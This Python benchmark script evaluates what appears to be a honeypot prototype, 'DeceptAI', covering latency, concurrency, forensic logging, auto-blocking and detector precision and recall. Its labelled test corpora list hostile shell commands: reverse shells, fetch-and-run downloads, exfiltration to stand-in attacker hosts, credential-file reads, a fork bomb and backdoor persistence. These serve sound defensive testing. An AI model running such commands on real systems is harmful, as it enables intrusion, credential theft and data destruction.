"""
benchmark.py -- reproducible evaluation of the DeceptAI prototype.

Run:   python benchmark.py            (full)      python benchmark.py --quick
Starts victim_server.py and sdn_controller.py itself, measures, prints a
table and writes results.json.  Everything runs on localhost loopback.

Experiments
  A  proxy overhead     : benign command RTT direct-to-victim vs through the controller
  B  redirection cost   : RTT of the command that triggers detection+clone+swap
  C  concurrency scaling: N simultaneous attacker sessions (success, latency, forensic completeness, leaks)
  D  detection quality  : precision/recall on a hand-labelled command corpus
  E  engagement scoring : three scripted attacker profiles            (Review-II build only)
  F  auto-block         : deep-engaged source is refused next time    (Review-II build only)
"""
import json, os, socket, statistics, subprocess, sys, threading, time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
os.chdir(HERE)
from config import HOST, CONTROLLER_LISTEN_PORT, VICTIM_PORT  # noqa: E402

try:
    import resource
    _s, _h = resource.getrlimit(resource.RLIMIT_NOFILE)
    resource.setrlimit(resource.RLIMIT_NOFILE, (min(_h, 65536), _h))
    def _raise_limits():
        resource.setrlimit(resource.RLIMIT_NOFILE, (min(_h, 65536), _h))
except Exception:                       # Windows
    _raise_limits = None

QUICK = "--quick" in sys.argv
HAS_V2 = os.path.exists(os.path.join(HERE, "agents", "engagement.py"))
TRIGGER = "cat config.yaml"
BENIGN = ["whoami", "pwd", "ls", "id", "whoami"]


def pct(xs, p):
    xs = sorted(xs)
    return xs[min(len(xs) - 1, int(round(p / 100 * (len(xs) - 1))))] if xs else float("nan")


def stats(xs):
    if not xs:
        return {}
    return {"n": len(xs), "mean": round(statistics.mean(xs), 3), "p50": round(pct(xs, 50), 3),
            "p95": round(pct(xs, 95), 3), "p99": round(pct(xs, 99), 3), "max": round(max(xs), 3)}


class Servers:
    def __init__(self, env=None, victim_only=False):
        self.env = dict(os.environ, **(env or {}))
        self.victim_only = victim_only
        self.procs = []

    def __enter__(self):
        for f in ("forensic_report.json", "events.jsonl", "forensic_report.json.tmp"):
            try:
                os.remove(os.path.join(HERE, "logs", f))
            except OSError:
                pass
        os.makedirs(os.path.join(HERE, "logs"), exist_ok=True)
        names = ["victim_server.py"] + ([] if self.victim_only else ["sdn_controller.py"])
        for n in names:
            self.procs.append(subprocess.Popen([sys.executable, n], cwd=HERE, env=self.env,
                                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                               preexec_fn=_raise_limits if _raise_limits else None))
        for port in [VICTIM_PORT] + ([] if self.victim_only else [CONTROLLER_LISTEN_PORT]):
            for _ in range(100):
                try:
                    socket.create_connection((HOST, port), timeout=0.2).close()
                    break
                except OSError:
                    time.sleep(0.05)
        time.sleep(0.2)
        return self

    def controller_pid(self):
        return self.procs[-1].pid

    def __exit__(self, *a):
        for p in self.procs:
            p.terminate()
        for p in self.procs:
            try:
                p.wait(timeout=3)
            except Exception:
                p.kill()
        time.sleep(0.3)


def run_session(port, cmds, src=None, sleep=0.0, rtts=None):
    s = socket.socket()
    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
    s.settimeout(3)
    if src:
        s.bind((src, 0))
    s.connect((HOST, port))
    banner = s.recv(1024)
    if not banner:
        raise ConnectionError("no banner")
    out = []
    for c in cmds:
        if sleep:
            time.sleep(sleep)
        t0 = time.perf_counter()
        s.sendall(c.encode())
        r = s.recv(4096)
        dt = (time.perf_counter() - t0) * 1000
        if not r:
            raise ConnectionError("closed")
        out.append((c, dt, r))
    s.close()
    return out


# ------------------------------------------------------------------ A
def exp_a(n_sessions):
    res = {}
    with Servers() as sv:
        for label, port in (("direct_victim", VICTIM_PORT), ("via_controller", CONTROLLER_LISTEN_PORT)):
            xs = []
            for _ in range(n_sessions):
                xs += [d for _, d, _ in run_session(port, BENIGN)]
            res[label] = stats(xs)
    res["overhead_mean_ms"] = round(res["via_controller"]["mean"] - res["direct_victim"]["mean"], 3)
    res["overhead_p95_ms"] = round(res["via_controller"]["p95"] - res["direct_victim"]["p95"], 3)
    return res


# ------------------------------------------------------------------ B
def exp_b(n_sessions):
    trig, over, post = [], [], []
    fails, first_fail = 0, None
    with Servers() as sv:
        for i in range(n_sessions):
            try:
                r = run_session(CONTROLLER_LISTEN_PORT, BENIGN[:3] + [TRIGGER, "cat secret.txt", "cat access.log"])
            except Exception:
                fails += 1
                first_fail = first_fail or i + 1
                if fails >= 5:
                    break
                continue
            b = statistics.mean(d for _, d, _ in r[:3])
            trig.append(r[3][1]); over.append(r[3][1] - b); post += [r[4][1], r[5][1]]
    return {"sequential_sessions": n_sessions, "failed_sessions": fails, "first_failure_at_session": first_fail,
            "trigger_rtt_ms": stats(trig), "redirect_overhead_ms": stats(over), "post_redirect_rtt_ms": stats(post)}


# ------------------------------------------------------------------ C
def proc_stats(pid):
    try:
        fds = len(os.listdir(f"/proc/{pid}/fd"))
        thr = int([l for l in open(f"/proc/{pid}/status") if l.startswith("Threads")][0].split()[1])
        rss = int([l for l in open(f"/proc/{pid}/status") if l.startswith("VmRSS")][0].split()[1]) / 1024
        return {"open_fds": fds, "threads": thr, "rss_mb": round(rss, 1)}
    except Exception:
        return {}


def exp_c(levels):
    out = []
    for n in levels:
        with Servers() as sv:
            lock = threading.Lock()
            ok, errs, benign, trig, post, wall = [0], [], [], [], [], []
            start = threading.Event()

            def worker():
                start.wait()
                t0 = time.perf_counter()
                try:
                    r = run_session(CONTROLLER_LISTEN_PORT, BENIGN[:3] + [TRIGGER, "cat secret.txt", "cat access.log", "exit"][:-1] + ["exit"][:0])
                    good = all(x[2] for x in r)
                    with lock:
                        ok[0] += 1 if good else 0
                        benign.extend(d for _, d, _ in r[:3]); trig.append(r[3][1]); post.extend(d for _, d, _ in r[4:])
                        wall.append(time.perf_counter() - t0)
                except Exception as e:
                    with lock:
                        errs.append(type(e).__name__)
            ths = [threading.Thread(target=worker) for _ in range(n)]
            [t.start() for t in ths]
            t0 = time.perf_counter(); start.set()
            [t.join(timeout=60) for t in ths]
            total = time.perf_counter() - t0
            time.sleep(2.0)                       # let background flush / teardown settle
            ps = proc_stats(sv.controller_pid())
            expected_sessions, expected_cmds = ok[0], ok[0] * 3
            sess, cmds, corrupt = 0, 0, False
            try:
                rep = json.load(open(os.path.join(HERE, "logs", "forensic_report.json")))
                for ev in rep.values():
                    names = [e["event"] for e in ev]
                    sess += 1 if "redirected" in names else 0
                    cmds += names.count("attacker_command")
            except Exception:
                corrupt = True
            out.append({
                "concurrent_sessions": n,
                "completed": ok[0], "failed": n - ok[0],
                "success_rate_pct": round(100 * ok[0] / n, 1),
                "error_types": sorted(set(errs)),
                "wall_clock_s": round(total, 2),
                "sessions_per_s": round(ok[0] / total, 1) if total else 0,
                "benign_rtt_ms": stats(benign), "trigger_rtt_ms": stats(trig), "post_redirect_rtt_ms": stats(post),
                "forensic_sessions_logged": sess, "forensic_commands_logged": cmds,
                "forensic_completeness_pct": round(100 * min(cmds, expected_cmds) / expected_cmds, 1) if expected_cmds else 0.0,
                "forensic_report_corrupt": corrupt,
                "controller_after_load": ps,
            })
            print(f"   C n={n}: ok={ok[0]}/{n} trig_p95={stats(trig).get('p95')}ms forensic={out[-1]['forensic_completeness_pct']}% fds={ps.get('open_fds')} thr={ps.get('threads')}", flush=True)
    return out


# ------------------------------------------------------------------ D
MALICIOUS = [
    "cat /etc/passwd", "cat /etc/shadow", "cat ~/.ssh/id_rsa", "cat .env", "cat config.yaml", "cat secret.txt", "type secrets.txt",
    "less /etc/shadow", "head -n 5 /etc/shadow", "cp /etc/shadow /tmp/s", "scp /var/db/users.db attacker@203.0.113.9:/tmp", "wget http://203.0.113.9/x.sh",
    "curl -O http://203.0.113.9/payload", "wget -q http://evil.example/miner -O /tmp/m", "cat /home/appadmin/.aws/credentials", "cat database.yml",
    "select * from users;", "SELECT password FROM admins", "drop table users;", "insert into admins values ('x','y')", "update users set role='admin'",
    "sudo su", "sudo -l", "sudo cat /root/.bash_history", "chmod 777 /etc/passwd", "chmod +s /bin/bash", "sudo chmod 4755 /bin/sh",
    "hping3 --flood 10.0.0.5", "slowloris.py 10.0.0.5", "ddos tool start", ":(){ :|:& };:", "while true; do loop; done",
    "cat /var/backups/db_dump.sql", "cat backup.tar.gz | nc 203.0.113.9 9", "download customer_list.csv", "get /etc/passwd",
    "cat .git/config", "type id_rsa", "cat /root/.ssh/id_rsa", "cat shadow.bak",
    # known-hard cases (no keyword from the signature list)
    "base64 -d payload.b64 | sh", "python3 -c 'import os;os.system(\"id\")'", "nc -e /bin/sh 203.0.113.9 4444", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1",
    "find / -perm -4000 2>/dev/null", "tail -n 20 /var/log/auth.log", "env | grep -i key", "tac /etc/passwd", "ls -la /root", "tar czf - /var/www | ssh a@203.0.113.9 'cat > w.tgz'",
]
BENIGN_CMDS = [
    "ls", "ls -la", "pwd", "whoami", "id", "uptime", "df -h", "free -m", "ps aux", "top -bn1", "date", "hostname", "uname -a", "echo hello",
    "cd /var/www", "mkdir test", "touch notes", "grep error app.log", "tail -f app.log", "history", "clear", "systemctl status nginx", "docker ps",
    "git status", "python app.py", "npm start", "pip list", "ping -c 2 8.8.8.8", "netstat -tulpn", "which python3", "echo $PATH", "ls logs/",
    "du -sh .", "head -n 3 README", "wc -l app.py", "ls /var/log", "journalctl -n 20", "lsblk", "ip addr", "cal",
    # benign commands that contain signature keywords (realistic false-positive risks)
    "cat README.md", "cat /var/log/syslog", "cat notes.txt", "sudo apt update", "sudo systemctl restart nginx", "curl localhost:8080/health",
    "wget https://example.com/readme.txt", "cat app.py", "update-alternatives --list python", "git config user.name",
]


def exp_d():
    from agents.detection_agent import DetectionAgent
    det = DetectionAgent()
    tp = fp = fn = tn = 0
    fn_list, fp_list = [], []
    for i, c in enumerate(MALICIOUS):
        flagged = det.inspect(f"m{i}", c)[0]
        if flagged: tp += 1
        else: fn += 1; fn_list.append(c)
    for i, c in enumerate(BENIGN_CMDS):
        flagged = det.inspect(f"b{i}", c)[0]
        if flagged: fp += 1; fp_list.append(c)
        else: tn += 1
    prec = tp / (tp + fp) if tp + fp else 0
    rec = tp / (tp + fn) if tp + fn else 0
    f1 = 2 * prec * rec / (prec + rec) if prec + rec else 0
    # session-level: 8 benign keyword-free commands in ONE session trips the message-count rule
    det2 = DetectionAgent()
    long_flag = any(det2.inspect("long", c)[0] for c in ["ls", "pwd", "whoami", "id", "uptime", "date", "hostname", "ls"])
    # micro-benchmark
    t0 = time.perf_counter(); N = 20000
    d3 = DetectionAgent()
    for i in range(N):
        d3.inspect(f"s{i % 50}", "ls -la")
    us = (time.perf_counter() - t0) / N * 1e6
    return {"malicious": len(MALICIOUS), "benign": len(BENIGN_CMDS), "TP": tp, "FP": fp, "FN": fn, "TN": tn,
            "precision": round(prec, 3), "recall": round(rec, 3), "f1": round(f1, 3),
            "accuracy": round((tp + tn) / (tp + tn + fp + fn), 3),
            "false_negatives": fn_list, "false_positives": fp_list,
            "long_benign_session_flagged_by_count_rule": long_flag, "inspect_time_us": round(us, 2)}



HELD_M = ["cat /var/www/html/wp-config.php","mysql -u root -p -e 'select * from users'","scp -r /home/appadmin user@198.51.100.7:/data","tar -czf /tmp/home.tgz /home/appadmin","cat ~/.kube/config","aws s3 cp /tmp/data.tgz s3://attacker-bucket/","echo '* * * * * /tmp/x.sh' | crontab -","curl -s http://198.51.100.9/a.sh | bash","useradd -m -s /bin/bash backdoor","cat /etc/ssh/sshd_config; cat /root/.ssh/id_rsa","wget http://198.51.100.9/m -O /tmp/m && chmod +x /tmp/m","docker exec -it db mysqldump app","history | grep ssh","pg_dump -U postgres prod > /tmp/p.sql","rm -rf /var/www","systemctl stop nginx","openssl enc -aes-256-cbc -in data.sql -out data.enc","cat .git-credentials","python3 -c 'import pty;pty.spawn(\"/bin/sh\")'","find / -name '*.key' 2>/dev/null","gcloud auth print-access-token","cat /proc/self/environ","sqlmap -u http://app/login","john shadow.txt","zip -r /tmp/all.zip /var/www"]
HELD_B = ["ls -la /var/www","tail -f /var/log/nginx/error.log","git pull origin main","pip install -r requirements.txt","sudo systemctl restart gunicorn","docker ps -a","kubectl get pods","cat /etc/hostname","top -b -n 1","grep ERROR app.log","vim app.py","python manage.py migrate","npm run build","curl -I https://example.com","ssh-keygen -l -f key.pub","df -h /var","du -sh /var/log","cat /etc/os-release","journalctl -u nginx -n 50","systemctl status mysql","ping -c 3 10.0.0.1","cat requirements.txt","free -h","crontab -l","who"]


def exp_d2():
    """Second corpus written AFTER the v2 rules were frozen (rules not tuned on it)."""
    from agents.detection_agent import DetectionAgent
    det = DetectionAgent()
    fn = [c for i, c in enumerate(HELD_M) if not det.inspect(f"m{i}", c)[0]]
    fp = [c for i, c in enumerate(HELD_B) if det.inspect(f"b{i}", c)[0]]
    tp = len(HELD_M) - len(fn); tn = len(HELD_B) - len(fp)
    prec = tp / (tp + len(fp)) if tp + len(fp) else 0; rec = tp / len(HELD_M)
    return {"malicious": len(HELD_M), "benign": len(HELD_B), "TP": tp, "FP": len(fp), "FN": len(fn), "TN": tn,
            "precision": round(prec, 3), "recall": round(rec, 3), "false_negatives": fn, "false_positives": fp}

# ------------------------------------------------------------------ E / F
def exp_e():
    profiles = {
        "A_scanner": (["whoami", "cat config.yaml"], 0.1),
        "B_explorer": (["whoami", "ls", "cat config.yaml", "cat access.log", "ls", "pwd", "id"], 0.3),
        "C_data_thief": (["whoami", "cat config.yaml", "cat secret.txt", "cat access.log", "cat .env", "cat /etc/passwd", "cat /etc/shadow",
                          "ls", "cat backup_2026.tar.gz", "id", "pwd", "cat id_rsa"], 0.6),
    }
    res = {}
    with Servers() as sv:
        for name, (cmds, sl) in profiles.items():
            run_session(CONTROLLER_LISTEN_PORT, cmds + ["exit"], sleep=sl)
        time.sleep(1.5)
        rep = json.load(open(os.path.join(HERE, "logs", "forensic_report.json")))
    for sid, ev in rep.items():
        sc = [e for e in ev if e["event"] == "engagement_score"]
        if sc:
            d = sc[0]["details"]; res[sid] = d
    ordered = sorted(res.values(), key=lambda d: d["commands"])
    return {"profiles": dict(zip(profiles.keys(), ordered))}


def exp_f():
    env = {"DECEPTAI_AUTO_BLOCK": "1", "DECEPTAI_BLOCK_MIN": "20"}
    deep = ["whoami", "cat config.yaml", "cat secret.txt", "cat .env", "ls", "cat /etc/passwd", "id", "pwd"]
    res = {}
    with Servers(env=env) as sv:
        try:
            run_session(CONTROLLER_LISTEN_PORT, deep + ["exit"], src="127.0.0.2", sleep=0.2)
            time.sleep(0.5)
            try:
                run_session(CONTROLLER_LISTEN_PORT, ["whoami"], src="127.0.0.2")
                res["blocked_source_refused"] = False
            except Exception:
                res["blocked_source_refused"] = True
            try:
                run_session(CONTROLLER_LISTEN_PORT, ["whoami"], src="127.0.0.1")
                res["other_source_still_served"] = True
            except Exception:
                res["other_source_still_served"] = False
        except OSError as e:
            res["skipped"] = f"cannot bind 127.0.0.2 here: {e}"
    return res


def main():
    r = {"environment": {"python": sys.version.split()[0], "platform": sys.platform, "cpus": os.cpu_count(),
                         "build": "review2" if HAS_V2 else "review1"}}
    print("A  proxy overhead ...", flush=True);     r["A_proxy_overhead"] = exp_a(100 if QUICK else 600)
    print("B  redirection cost ...", flush=True);   r["B_redirection"] = exp_b(40 if QUICK else 200)
    print("C  concurrency scaling ...", flush=True); r["C_concurrency"] = exp_c([10, 50, 100] if QUICK else [10, 50, 100, 200, 400])
    print("D  detection quality ...", flush=True);  r["D_detection"] = exp_d()
    print("D2 held-out detection ...", flush=True); r["D2_heldout_detection"] = exp_d2()
    if HAS_V2:
        print("E  engagement scoring ...", flush=True); r["E_engagement"] = exp_e()
        print("F  auto-block ...", flush=True);         r["F_autoblock"] = exp_f()
    json.dump(r, open(os.path.join(HERE, "results.json"), "w"), indent=2)
    print(json.dumps({k: v for k, v in r.items() if k not in ("C_concurrency",)}, indent=1)[:3500])
    print("\nwrote results.json")


if __name__ == "__main__":
    main()
